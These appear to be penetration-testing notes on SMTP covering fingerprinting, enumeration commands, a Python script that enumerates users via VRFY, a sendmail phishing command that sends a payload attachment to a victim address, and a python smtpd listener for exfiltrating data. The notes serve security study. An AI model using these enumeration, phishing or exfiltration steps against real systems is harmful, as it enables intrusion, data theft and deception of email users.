# SMTP

Simple Mail Transfer Protocol. 

Does exactly what it says on the tin, allows for a nice simple method of sending an email. 

SMTP is what we use to `send` email, however it's not the best for receiving so typically POP3 and IMAP are what we use to `receive` emails. It's not that it can't do it, it's just not particularly good at it so people tend to use one of the other protocols to receive mail.

[What is SMTP](https://whatis.techtarget.com/definition/SMTP-Simple-Mail-Transfer-Protocol)



## Fingerprinting

Basic Banner Grab:

```bash
nc -nv 10.10.10.10 25
```

Connecting to SMTPS:

```bash
openssl s_client -crlf -connect smtp.mailgun.org:465 #SSL/TLS without starttls command
openssl s_client -starttls smtp -crlf -connect smtp.mailgun.org:587
```

Looking up Mail Exchanges for a domain:

```bash
dig +short mx google.com
```

Basic Enumeration:

```bash
nmap -p25 --script smtp-commands 10.10.10.10
```

## Command Enumeration

SMTP services respond to a few different commands that can be used to enumerate users on the box, it really depends on the version and the configuration what it allows for:

- `RCPT TO`
- `VRFY`
- `EXPN`

## User Enumeration Using VRFY

```python
#!/usr/bin/python

import socket 
import sys

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

ip = sys.argv[1]

connect = s.connect((ip,25))
banner = s.recv(1024)
print banner

with open("user_list.txt") as payloads:
        for p in payloads:
                s.send("VRFY " + p.rstrip() + '\r\n')
                result = s.recv(1024)
                print result

s.close()
```

## Sending an Email (Phishing)

```bash
sendmail -t itdept@victim.com -f techsupport@bestcomputers.com -s 192.168.8.131 -u Important Upgrade Instructions -a /tmp/BestComputers-UpgradeInstructions.pdf
```

Hopefully someone reads it and our payload gets triggered. 

We can use `msfvenom` to generate things like HTA files and malicious PDFs. 

## Data Exfiltration

If you can send data to an SMTP server, you can create a SMTP server to receive and process the incoming data with python (hint: it's not a standard text-format):

```bash
sudo python -m smtpd -n -c DebuggingServer :25
```

## Further Reading

[Pentesting SMTP](https://book.hacktricks.xyz/pentesting/pentesting-smtp) 

Lots more stuff about spoofing headers and other tricks that will come in handy.

[Exfiltration via SMTP](https://book.hacktricks.xyz/exfiltration#smtp)


